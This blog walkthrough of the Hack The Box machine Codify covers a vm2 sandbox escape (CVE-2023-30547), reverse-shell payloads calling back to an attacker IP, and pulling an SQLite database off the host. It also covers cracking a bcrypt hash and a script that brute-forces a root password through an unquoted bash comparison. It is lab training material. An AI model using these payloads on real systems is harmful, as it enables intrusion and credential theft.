---
title: "Codify Walkthrough - HTB Easy | vm2 RCE & Bash Wildcard Exploitation"
description: "Complete walkthrough of Codify from Hack The Box. Covers vm2 sandbox escape (CVE-2023-30547), Node.js RCE exploitation, SQLite database extraction, bcrypt password cracking, and bash wildcard privilege escalation."
author: dua2z3rr
date: 2025-11-30 1:00:00
categories: [HackTheBox, Machines]
tags: ["web-application", "vulnerability-assessment", "databases", "custom-applications", "injections", "source-code-analysis", "weak-credentials", "remote-code-execution", "clear-text-credentials", "default-credentials", "misconfiguration", "bash", "javascript", "mysql", "nodejs", "sqlite", "reconnaissance", "user-enumeration", "web-site-structure-discovery", "system-exploitation", "password-reuse", "password-cracking", "sudo-exploitation"]
image: /assets/img/codify/codify-resized.png
---

## Overview

Codify is an easy-level Linux machine from Hack The Box featuring a web application that allows users to test Node.js code. The application uses a vulnerable vm2 library that can be exploited for remote code execution. Enumeration reveals an SQLite database containing a password hash, which when cracked provides SSH access. Finally, a vulnerable bash script can be executed with elevated privileges to reveal the root user's password through wildcard exploitation.

---

## External Enumeration

### Nmap Scan

Starting with a comprehensive port scan:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.239 -vv -p- -sC -sV
<SNIP>
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Codify
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- SSH on port 22
- Apache redirecting to `codify.htb` on port 80
- Node.js Express application on port 3000

---

## Web Application Analysis

### Initial Exploration

After adding `codify.htb` to `/etc/hosts`, port 80 redirects to the Node.js application on port 3000:

![Codify Homepage](/assets/img/codify/codify-1.png)

The website provides a Node.js code testing environment—a sandbox for executing JavaScript code.

### Testing for Code Execution

Attempting to execute a simple reverse shell:

![Testing basic payload](/assets/img/codify/codify-2.png)

```js
require('child_process').exec('nc -e bash 10.10.16.4 9001')
```

![Blocked by blacklist](/assets/img/codify/codify-3.png)

**Result:** The application has defense mechanisms in place—`child_process` is blacklisted.

### Testing Blacklist Implementation

Testing with a different payload to confirm the blacklist isn't hardcoded:

![Testing blacklist](/assets/img/codify/codify-4.png)

This confirms the filtering is dynamic and targets specific dangerous modules.

---

## VM2 Sandbox Escape

### Discovering the Vulnerability

After researching Node.js sandboxing, I discovered that `require("vm")` is **not** blocked. Further investigation led me to a known vm2 sandbox escape technique: [Sandboxing Node.js is Hard](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)

Testing the bypass:

![VM2 sandbox escape test](/assets/img/codify/codify-5.png)

**Success!** The vm2 library is vulnerable to sandbox escape.

### Understanding the Exploit

The exploit chain works as follows:

**1. Starting Point: `this`**

```js
this.constructor.constructor('return this.process.env')()
```

In JavaScript, `this` in the global context points to the global object. Even when code runs in a new V8 context, `this` maintains a reference that can be exploited.

**2. The Constructor Chain**

```js
this → Object instance
this.constructor → Object Constructor (function that creates objects)
this.constructor.constructor → Function Constructor (function that creates functions)
```

The Function Constructor is special because:
- It has access to the global scope of the main Node.js process
- It can create functions at runtime from strings
- It bypasses VM context restrictions

**3. Arbitrary Code Execution**

```js
this.constructor.constructor('return this.process')()
```

This gives us access to the main process object, which includes `child_process` and other dangerous modules.

---

## Initial Access

### Crafting the Reverse Shell

Using the vm2 escape to obtain a reverse shell on port 9001:

```js
"use strict";
const vm = require("vm");
const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQ==" | base64 -d | bash').toString()`);
console.log(xyz);
```

**Foothold achieved** as user `svc`

---

## Lateral Movement

### Internal Enumeration

Exploring the web application directory `/var/www/contact`:

```shell
svc@codify:/var/www/contact$ ls -al
total 120
drwxr-xr-x 3 svc  svc   4096 Sep 12  2023 .
drwxr-xr-x 5 root root  4096 Sep 12  2023 ..
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12  2023 tickets.db
```

**Important discovery:** SQLite database file `tickets.db`

### Exfiltrating the Database

Setting up a simple HTTP server to download the database:

```shell
svc@codify:/var/www/contact$ python3 -m http.server
python3 -m http.server
10.10.16.4 - - [30/Nov/2025 15:38:00] "GET /tickets.db HTTP/1.1" 200 -
```

On the attacking machine:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $wget http://codify.htb:8000/tickets.db
--2025-11-30 16:38:00--  http://codify.htb:8000/tickets.db
Resolving codify.htb (codify.htb)... 10.10.11.239
Connecting to codify.htb (codify.htb)|10.10.11.239|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/octet-stream]
Saving to: 'tickets.db'

tickets.db                100%[=================================>]  20.00K  --.-KB/s    in 0.08s   

2025-11-30 16:38:00 (251 KB/s) - 'tickets.db' saved [20480/20480]
```

### Analyzing the Database

Examining the SQLite database:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sqlite3 tickets.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> SELECT * FROM users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

**Credentials found:**
- **Username:** `joshua`
- **Password hash:** `$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2` (bcrypt)

---

## Password Cracking

### Identifying the Hash Type

The hash format `$2a$12$` identifies this as a **bcrypt hash**.

### Cracking with Hashcat

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt

┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -m 3200 -a 0 hash.txt rockyou.txt 
hashcat (v6.2.6) starting

<SNIP>

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Time.Started.....: Sun Nov 30 16:44:16 2025 (58 secs)
Time.Estimated...: Sun Nov 30 16:45:14 2025 (0 secs)
Speed.#1.........:       25 H/s (8.15ms)
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1408/14344385 (0.01%)
```

**Password cracked:** `spongebob1`

### SSH Access

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh joshua@codify.htb
joshua@codify.htb's password: spongebob1
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

joshua@codify:~$
```

**User flag obtained.**

---

## Privilege Escalation

### Sudo Enumeration

Checking sudo permissions:

```shell
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

**Key finding:** User `joshua` can execute `/opt/scripts/mysql-backup.sh` as root.

### Analyzing the Backup Script

Examining the vulnerable script:

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

# ... backup operations ...
```

### Vulnerability Analysis

**The vulnerability lies in the password comparison:**

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
```

When using `[[ ]]` in bash:
- **With quotes:** The right side is treated as a literal string
- **Without quotes:** The right side is treated as a glob pattern

**Example:**

```bash
string="hello world"

# Without quotes - pattern matching
if [[ $string == hello* ]]; then
    echo "Match!"  # This prints "Match!"
fi

# With quotes - literal comparison
if [[ $string == "hello*" ]]; then
    echo "Match!"  # This does NOT print anything
fi
```

In the script, `$USER_PASS` is **not quoted**, so we can use wildcards to brute-force the password character by character.

---

## Exploiting Bash Wildcards

### Understanding the Attack

We can brute-force each character of the root password using the wildcard `*`:

- Input `a*` → If password starts with 'a', it matches
- Input `ab*` → If password starts with 'ab', it matches
- Continue until we discover the full password

### Automated Exploit Script

Python script to automate the wildcard brute-force:

```python
import subprocess

lista = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','1','2','3','4','5','6','7','8','9','0','!','?','$','%','&','/','(',')','=','-']

passwordCorretta=""
temp=""
ancora=True

while ancora:
	ancora=False
	for i in lista:
		temp=passwordCorretta+i+'*'
		comando=f"echo '{temp}' | sudo /opt/scripts/mysql-backup.sh"
		risultato = subprocess.run(comando, shell=True, capture_output=True, text=True)
		
		if "failed" in risultato.stdout:
			print("character " + i +" is wrong")
		else:
			passwordCorretta=passwordCorretta+i
			print("character " + i +" is right")
			ancora=True
			break

print(passwordCorretta)
```

### Running the Exploit

```text
character q is wrong
character w is wrong
character e is wrong
character r is wrong
<SNIP>
character k is right
character l is right
character j is right
character h is right
<SNIP>
kljh12k3jhaskjh12kjh3
```

**Root password discovered:** `kljh12k3jhaskjh12kjh3`

### Root Access

```shell
joshua@codify:~$ su root
Password: kljh12k3jhaskjh12kjh3
root@codify:/home/joshua#
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

The vm2 sandbox escape really opened my eyes to how difficult it is to properly sandbox JavaScript. Even though `child_process` was explicitly blacklisted, the prototype chain manipulation completely bypassed those restrictions. This isn't just an academic vulnerability—vm2 was used in production environments, and this CVE (CVE-2023-30547) affected real applications. It made me realize that "sandboxing" is much harder than it appears, and you can't just blacklist dangerous functions and call it secure.

### Alternative Approaches

For the privilege escalation, I could have approached the bash wildcard vulnerability differently. Instead of writing a Python script, I could have used a bash one-liner with a loop to achieve the same result.

### Open Question

The bash wildcard vulnerability was surprisingly simple to exploit, but how common is this pattern in real-world scripts? Do experienced sysadmins know to **always quote variables in bash conditionals**, or is this a mistake that still shows up frequently? I'm also curious: are there automated tools that scan bash scripts for this kind of vulnerability, similar to how static analysis tools work for other languages?

---

**Completed this box? What was your approach to escalate privileges?** Comment down below!
